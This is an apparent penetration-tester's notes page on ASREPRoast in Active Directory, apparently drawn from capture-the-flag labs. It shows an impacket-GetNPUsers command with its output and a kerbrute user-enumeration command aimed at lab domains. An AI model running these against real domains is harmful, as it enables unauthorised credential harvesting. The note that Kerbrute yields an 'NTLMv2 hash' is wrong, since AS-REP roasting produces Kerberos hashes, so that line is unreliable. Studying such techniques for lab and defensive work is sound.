---
description: >-
  ASREPRoast Attack
title: ASREPRoast Attack             # Add title here
date: 2023-02-08 08:00:00 -0600                           # Change the date to match completion date
categories: [12 Active Directory, Enumeration]                     # Change Templates to Writeup
tags: [active directory, enumeration, asreproast]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---
### Unauthenticated

If we get valid users we can try to request TGT tickets to authenticate as another user:

> Remember to add the name of the domain controller into the /etc/hosts for this command to work.
{: .prompt-tip }
```bash
impacket-GetNPUsers scrm.local/ -no-pass -usersfile ../content/validUsers
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User ASMITH@scrm.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User JHALL@scrm.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User KSIMPSON@scrm.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User KHICKS@scrm.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SJENKINS@scrm.local doesn't have UF_DONT_REQUIRE_PREAUTH set
```

### Kerbrute
Kerbrute extracts the NTLMv2 hash automatically if two conditions are meet:
* If the user is valid.
* If the user has no pre auth required.
```bash
kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.10.10.175 /usr/share/seclists/Kerberos/A-ZSurnames.txt
```
[[Sauna#^9e845d]]
